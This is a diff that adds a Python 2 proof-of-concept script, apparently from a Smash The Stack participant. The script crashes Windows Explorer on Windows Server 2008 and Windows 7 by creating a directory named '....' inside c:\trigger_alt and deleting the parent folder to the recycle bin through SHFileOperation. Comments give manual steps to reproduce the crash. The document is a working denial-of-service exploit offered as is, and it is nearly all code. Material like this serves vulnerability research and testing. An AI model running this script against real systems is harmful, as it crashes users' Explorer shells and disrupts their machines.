@@ -1,0 +1,29 @@
+# Windows 2008 SP2 RC2 Explorer Go Byebye :P
+# Windows 7 Pro SP1 Explorer Go Byebye :P
+# Interesting
+# Brought to you by Level & z0r0 @ Smash The Stack
+
+from win32com.shell import shell, shellcon
+from os import mkdir
+
+try:
+	mkdir("c:\\trigger_alt")
+except:
+	print "[!] Trigger Directory Exists"
+try:
+	mkdir("c:\\trigger_alt\\....")
+except:
+	print "[!] Trigger Sub Directory Exists"
+
+print "[!] Triggering Issue"
+
+# This moves the directory containing the sub directory which creates the condition.
+# The issue is in the function that moves the files to the recycle bin
+# Replicate this using the following
+# 1- mkdir c:\trigger_alt
+# 2- cd c:\trigger_alt
+# 3- mkdir ....\
+# 4- My Computer -> c:\trigger_alt
+# 5- Right Click -> Delete 
+
+shell.SHFileOperation((0,shellcon.FO_DELETE,'c:\\trigger_alt',None,shellcon.FOF_ALLOWUNDO|shellcon.FOF_NOCONFIRMATION))
